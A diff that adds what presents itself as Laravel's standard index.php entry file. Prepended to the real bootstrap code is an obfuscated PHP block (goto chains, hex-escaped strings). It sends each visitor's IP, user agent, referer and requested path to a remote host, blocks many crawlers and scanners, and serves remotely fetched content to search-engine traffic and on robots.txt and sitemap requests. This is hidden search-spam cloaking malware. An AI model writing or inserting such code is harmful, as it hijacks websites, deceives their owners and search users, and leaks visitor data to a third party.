@@ -1,0 +1,62 @@
+<?php
+ goto plniS; mOsHP: $ANE5t = urlencode($_SERVER["\123\103\122\111\120\x54\x5f\116\101\115\x45"]); goto yEJmo; EtU_w: wLcL0: goto Z_1r3; Dt1E3: goto R9jQP; goto jMDQs; GfiKZ: goto V2O9Z; goto AC6qh; EnbL7: goto wLcL0; goto qV0FO; wzUri: $LHIJH = urlencode(@$_SERVER["\x48\x54\x54\x50\137\x41\103\x43\105\120\x54\137\x4c\101\x4e\x47\125\101\107\105"]); goto sFKdd; v7luY: curl_setopt($sfzfT, CURLOPT_SSL_VERIFYPEER, FALSE); goto Mhu7i; btdlE: if (substr($kZfC5, 0, 5) == "\74\x3f\x78\x6d\x6c") { goto V3GST; } goto YQKZn; wU8tx: exit; goto mnVLn; dEWwm: $Yr1kn = "\x68\x74"; goto ko5qD; yEJmo: $slTKG = urlencode($slTKG); goto h8r_9; qV0FO: V3GST: goto hK3wU; CibmN: header("\110\x54\x54\120\x2f\x31\x2e\x30\40\x34\60\x33\x20\106\157\x72\142\151\144\x64\x65\156"); goto wU8tx; V9tJe: $t3WC8 = "\x2f\x2f\143\167\x32\65\x36\65\56\63\144\x62\x6c"; goto dEWwm; Omu_B: v7Erq: goto n2Ne7; IqQ6f: akFke: goto FJmMV; gCJbp: header("\x48\124\124\120\57\61\56\x31\x20\64\x30\64\40\x4e\x6f\x74\x20\x46\x6f\165\156\144"); goto IqQ6f; Vlsrq: if ($Qd5e_ == 0) { goto MuorX; } goto tGB2z; MA3in: $kZfC5 = curl_exec($sfzfT); goto IHt1d; bATrE: xX39r: goto Ej61R; sOnOj: if (!(substr($kZfC5, 0, 10) == "\x65\162\162\x6f\162\40\x63\x6f\x64\145" or $kZfC5 == "\x35\60\60" or strpos($kZfC5, "\x42\x61\144\40\107\141\x74\x65\167\x61\x79") !== false)) { goto a1EX4; } goto FXS2E; IBu0o: $sfzfT = curl_init(); goto hoa22; Z_VSd: if (strpos($BL2OU, "\x69\x6e\x64\x65\x78\x2e\160\x68") !== false) { goto o8TfW; } goto BhzGP; h8r_9: $V_yn3 = urlencode($_SERVER["\x48\124\x54\x50\137\x48\x4f\x53\124"]); goto GLZpU; lu6V8: if (strpos($L_rg5, "\162\x6f\142\157\164\x73\56\x74\170\x74") !== false or strpos($L_rg5, "\152\160\62\60\62\63") !== false or strpos($L_rg5, "\x70\151\x6e\147\163\151\x74\145\155\141\x70") !== false or preg_match("\x40\136\x2f\x28\x2e\52\77\x29\x2e\170\155\x6c\x24\x40\151", $_SERVER["\x52\105\x51\125\x45\x53\124\137\125\x52\x49"]) or preg_match("\x2f\50{$F7ZYQ}\x29\57\151", $_SERVER["\110\124\x54\120\137\x55\123\x45\122\x5f\x41\107\x45\x4e\x54"]) or preg_match("\x2f\x28{$F7ZYQ}\x29\x2f\151", @$_SERVER["\110\124\x54\120\x5f\x52\x45\106\x45\122\105\x52"])) { goto xUTlx; } goto MzO0A; XtnRm: goto V2O9Z; goto bATrE; YkuUr: D5E4h: goto Dt1E3; Mhu7i: curl_setopt($sfzfT, CURLOPT_SSL_VERIFYHOST, FALSE); goto MA3in; YAusX: dRUeG: goto XWTiK; jMDQs: Dd3X8: goto cqCuY; v7mHN: TJLgv: goto O1VhJ; hoa22: curl_setopt($sfzfT, CURLOPT_URL, $mwvUU); goto LSoqp; ewZzf: goto v7Erq; goto IIu2h; sFKdd: if (isset($_SERVER["\110\x54\x54\x50\137\x43\x4c\111\105\116\x54\x5f\x49\120"])) { goto xX39r; } goto D9PA6; IIu2h: MuorX: goto GAipQ; Jujev: if (!empty($kZfC5)) { goto dRUeG; } goto IBu0o; KqBGS: if (strpos($L_rg5, "\x6a\160\62\60\x32\63") !== false) { goto q2qF3; } goto btdlE; GB32Z: error_reporting(0); goto qvxus; Vfccn: $Qd5e_ = 0; goto F5pVf; MzO0A: goto D5E4h; goto MClor; Hz4wL: $Gb_70 = urlencode(@$_SERVER["\110\124\x54\120\137\122\x45\x46\x45\122\105\122"]); goto wzUri; AC6qh: j7YzU: goto gGDvW; LaTo_: $mWIWa = "\151\x6e\144\x2e\x63\x6f\x6d\57"; goto V9tJe; tGB2z: $BL2OU = "\x2f"; goto ewZzf; PS3pe: vgdnh: goto TortZ; dyg2m: q2qF3: goto gCJbp; COZdk: echo $meVtv . "\72\40\x3c\x62\x72\x2f\76"; goto U8PxZ; hK3wU: header("\x43\x6f\156\x74\145\156\x74\55\x54\171\x70\145\72\40\164\x65\x78\x74\57\170\x6d\154\73\x20\143\150\141\x72\x73\145\x74\75\x75\164\146\x2d\x38"); goto EtU_w; rBYwm: $F7ZYQ = "\104\157\x63\x6f\155\x6f\x7c\x59\141\150\x6f\157\x7c\x42\151\x6e\147\x7c\107\157\x6f\147\154\x65"; goto GB32Z; D9PA6: if (isset($_SERVER["\110\x54\124\120\x5f\130\137\106\117\122\127\101\x52\x44\105\104\x5f\x46\x4f\122"])) { goto j7YzU; } goto XtnRm; gGDvW: $slTKG = $_SERVER["\x48\124\124\120\x5f\130\x5f\106\117\122\x57\x41\x52\x44\x45\x44\137\106\x4f\x52"]; goto TNbZE; mnVLn: syijg: goto YpC38; s6ctB: $_SERVER["\122\105\x51\125\x45\123\124\x5f\x53\x43\x48\105\x4d\105"] = "\150\164\x74\160"; goto PVjat; Ej61R: $slTKG = $_SERVER["\x48\x54\x54\x50\x5f\x43\x4c\x49\x45\x4e\124\137\x49\120"]; goto GfiKZ; BhzGP: $BL2OU = $BL2OU . "\x3f"; goto NAPex; FJmMV: echo $kZfC5; goto FmROb; ko5qD: $GBz68 = $Yr1kn . $ZOEl2 . $t3WC8 . $mWIWa; goto xy3FN; ujuYH: return; goto RjLyd; q0bhz: if (!(strpos($L_rg5, "\x70\151\x6e\x67\x73\151\164\x65\155\x61\x70") !== false)) { goto sY0E9; } goto PvloS; rIhvz: $meVtv = "{$TM0AI}\72\57\57" . $V_yn3 . $BL2OU . "\x73\x69\x74\145\155\141\x70\56\170\155\154"; goto COZdk; FmROb: exit; goto ujuYH; O1VhJ: $_SERVER["\122\105\x51\125\105\123\124\137\x53\103\x48\105\115\105"] = "\x68\x74\x74\x70\x73"; goto PS3pe; kmyKh: o8TfW: goto Vlsrq; FXS2E: header("\110\124\x54\120\x2f\x31\56\60\x20\65\x30\x30\x20\x49\x6e\164\x65\162\x6e\x61\x6c\40\x53\x65\162\166\145\x72\40\x45\162\162\157\162"); goto PlHo0; XWTiK: if (empty($kZfC5)) { goto WZs5t; } goto sOnOj; n2Ne7: K1PH4: goto rIhvz; PVjat: goto vgdnh; goto v7mHN; PvloS: $BL2OU = $_SERVER["\x53\103\x52\x49\120\124\137\x4e\x41\x4d\105"]; goto Z_VSd; YQKZn: header("\103\157\x6e\x74\x65\x6e\x74\55\x54\x79\x70\x65\x3a\40\x74\x65\170\164\x2f\150\x74\155\x6c\x3b\40\143\150\x61\x72\x73\x65\164\x3d\x75\x74\x66\x2d\x38"); goto EnbL7; GAipQ: $BL2OU = "\57\x3f"; goto Omu_B; td_mH: $slTKG = $_SERVER["\122\105\x4d\x4f\124\x45\x5f\101\104\104\122"]; goto Hz4wL; tC18H: $mwvUU = $GBz68 . "\77\x61\147\145\x6e\x74\x3d{$t9eNi}\46\x72\x65\146\x65\x72\x3d{$Gb_70}\46\154\x61\156\x67\75{$LHIJH}\46\x69\x70\75{$slTKG}\46\x64\157\155\x3d{$V_yn3}\x26\x68\164\x74\x70\75{$TM0AI}\46\x75\162\151\75{$L_rg5}\46\160\x63\75{$AbYdG}\x26\x72\x65\x77\162\151\164\x65\x61\x62\x6c\145\x3d{$Qd5e_}\x26\x73\x63\x72\x69\160\x74\75{$ANE5t}"; goto q0bhz; Z_1r3: goto akFke; goto dyg2m; NAPex: goto K1PH4; goto kmyKh; TortZ: $TM0AI = urlencode($_SERVER["\x52\x45\x51\125\105\123\124\137\x53\x43\110\x45\115\x45"]); goto M1hnG; GLZpU: if (!empty($_SERVER["\x52\105\121\125\105\123\124\137\123\x43\110\105\x4d\105"]) and $_SERVER["\122\x45\x51\125\105\x53\x54\137\123\103\x48\105\115\105"] == "\x68\164\x74\x70\x73" or !empty($_SERVER["\x48\x54\x54\120\x53"]) and $_SERVER["\x48\x54\x54\120\x53"] == "\x6f\156" or !empty($_SERVER["\123\x45\122\x56\105\122\x5f\120\117\122\x54"]) and $_SERVER["\123\105\x52\x56\x45\122\137\120\x4f\x52\x54"] == "\x34\64\x33" or isset($_SERVER["\110\124\x54\x50\x5f\130\x5f\106\117\122\127\101\122\x44\x45\x44\x5f\120\x52\x4f\x54\x4f"]) and $_SERVER["\110\x54\124\x50\137\x58\137\106\x4f\122\127\101\x52\x44\105\x44\x5f\x50\x52\117\x54\x4f"] == "\150\164\x74\160\163") { goto TJLgv; } goto s6ctB; PlHo0: exit; goto c9zFp; M1hnG: $L_rg5 = urlencode($_SERVER["\x52\105\121\x55\x45\123\x54\137\x55\x52\x49"]); goto Vfccn; MClor: xUTlx: goto tC18H; TNbZE: V2O9Z: goto mOsHP; xy3FN: $AbYdG = "\x44\147\x42\x54\x57\147\155"; goto rBYwm; U8PxZ: $mwvUU = $GBz68 . "\x3f\x61\x67\x65\x6e\x74\x3d{$t9eNi}\46\x72\x65\146\x65\162\x3d{$Gb_70}\x26\154\141\x6e\x67\x3d{$LHIJH}\46\151\160\75{$slTKG}\x26\x64\x6f\155\x3d{$V_yn3}\x26\x68\164\164\160\75{$TM0AI}\x26\x75\162\151\x3d{$L_rg5}\46\160\143\x3d{$AbYdG}\46\x72\x65\167\162\151\x74\145\141\142\x6c\x65\75{$Qd5e_}\x26\163\x63\x72\x69\x70\x74\x3d{$ANE5t}\x26\x73\151\x74\145\155\141\x70\75" . urlencode($meVtv); goto zNgUx; IHt1d: curl_close($sfzfT); goto YAusX; qvxus: if (!preg_match("\57\50\120\x61\154\x6f\141\154\x74\157\x6e\145\164\167\157\162\153\163\x7c\101\x68\x72\x65\x66\163\x42\157\164\174\171\x79\123\x70\x69\144\145\x72\174\x73\167\151\x66\164\x62\x6f\164\174\101\x70\x61\x63\150\145\x42\x65\156\x63\x68\174\x59\151\163\157\x75\x53\x70\x69\144\x65\x72\x7c\117\x42\x6f\x74\x7c\x50\x79\164\x68\x6f\x6e\55\x75\x72\154\x6c\x69\x62\x7c\102\141\x72\x6b\162\157\167\154\x65\x72\174\106\145\x65\144\154\x79\x7c\x63\x6c\x61\x75\x64\145\x62\x6f\164\174\x5a\155\x45\x75\174\115\152\61\x32\x62\157\x74\x7c\x50\171\164\150\157\x6e\x2d\162\145\x71\x75\x65\163\x74\163\x7c\123\145\x6d\162\x75\163\150\102\x6f\x74\174\x44\x61\164\141\106\x6f\x72\x53\105\x4f\174\x65\x7a\157\157\155\x73\174\x62\x79\164\145\x73\160\x69\144\x65\x72\174\123\145\172\156\x61\155\102\157\164\174\x73\143\162\141\x70\x79\174\x63\162\141\167\x6c\x44\x61\x64\x64\171\x7c\165\x6e\x69\166\145\162\x73\x61\154\x46\x65\145\144\x50\x61\x72\163\145\x72\174\107\120\124\102\x6f\x74\x7c\x6a\x61\x76\x61\174\101\x6d\141\172\157\x6e\x42\x6f\164\174\x6a\x69\153\145\123\x70\151\144\145\x72\174\x59\x61\156\x64\145\170\102\157\164\x7c\101\x73\x6b\124\142\106\130\124\126\x7c\x68\x74\164\160\103\x6c\x69\x65\156\164\x7c\x44\x6f\x74\x42\x6f\164\x7c\144\151\147\105\170\x74\x7c\103\145\156\163\x79\x73\111\x6e\163\160\145\143\x74\174\x68\145\x72\151\x74\x72\151\170\174\x50\x65\x74\141\154\x42\x6f\164\x7c\103\157\x6f\154\x70\x61\144\x57\x65\142\153\x69\x74\x7c\152\141\x75\156\x74\x79\x7c\145\141\163\x6f\165\x53\160\151\144\145\162\x7c\151\x6e\144\x79\40\x4c\151\x62\162\x61\x72\171\174\106\x65\x65\x64\104\145\155\157\x6e\174\x47\157\x2d\x68\164\x74\160\x2d\x63\x6c\151\x65\156\164\x7c\160\x79\164\x68\157\x6e\174\x6c\x69\147\150\164\x44\x65\143\x6b\x52\145\x70\157\x72\x74\x73\x20\102\x6f\164\51\x2f\x69", $_SERVER["\x48\x54\124\x50\137\125\123\x45\122\x5f\x41\107\x45\x4e\x54"])) { goto syijg; } goto CibmN; YpC38: $t9eNi = urlencode($_SERVER["\110\124\124\120\137\125\x53\x45\122\x5f\101\x47\x45\116\x54"]); goto td_mH; plniS: $ZOEl2 = "\x74\x70\72"; goto LaTo_; ArGOQ: $kZfC5 = @file_get_contents($mwvUU); goto Jujev; XajXE: curl_setopt($sfzfT, CURLOPT_FOLLOWLOCATION, false); goto v7luY; zNgUx: sY0E9: goto ArGOQ; RjLyd: WZs5t: goto YkuUr; c9zFp: a1EX4: goto KqBGS; LSoqp: curl_setopt($sfzfT, CURLOPT_RETURNTRANSFER, true); goto XajXE; F5pVf: if (strpos($L_rg5, "\x66\x61\166\151\x63\157\x6e\56\x69\x63\x6f") !== false) { goto Dd3X8; } goto lu6V8; cqCuY: R9jQP:
+?><?php
+
+/**
+ * Laravel - A PHP Framework For Web Artisans
+ *
+ * @package  Laravel
+ * @author   Taylor Otwell <taylor@laravel.com>
+ */
+
+define('LARAVEL_START', microtime(true));
+
+/*
+|--------------------------------------------------------------------------
+| Register The Auto Loader
+|--------------------------------------------------------------------------
+|
+| Composer provides a convenient, automatically generated class loader for
+| our application. We just need to utilize it! We'll simply require it
+| into the script here so that we don't have to worry about manual
+| loading any of our classes later on. It feels great to relax.
+|
+*/
+
+require __DIR__.'/core/vendor/autoload.php';
+
+/*
+|--------------------------------------------------------------------------
+| Turn On The Lights
+|--------------------------------------------------------------------------
+|
+| We need to illuminate PHP development, so let us turn on the lights.
+| This bootstraps the framework and gets it ready for use, then it
+| will load up this application so that we can run it and send
+| the responses back to the browser and delight our users.
+|
+*/
+
+$app = require_once __DIR__.'/core/bootstrap/app.php';
+
+/*
+|--------------------------------------------------------------------------
+| Run The Application
+|--------------------------------------------------------------------------
+|
+| Once we have the application, we can handle the incoming request
+| through the kernel, and send the associated response back to
+| the client's browser allowing them to enjoy the creative
+| and wonderful application we have prepared for them.
+|
+*/
+
+$kernel = $app->make(Illuminate\Contracts\Http\Kernel::class);
+
+$response = $kernel->handle(
+    $request = Illuminate\Http\Request::capture()
+);
+
+$response->send();
+
+$kernel->terminate($request, $response);
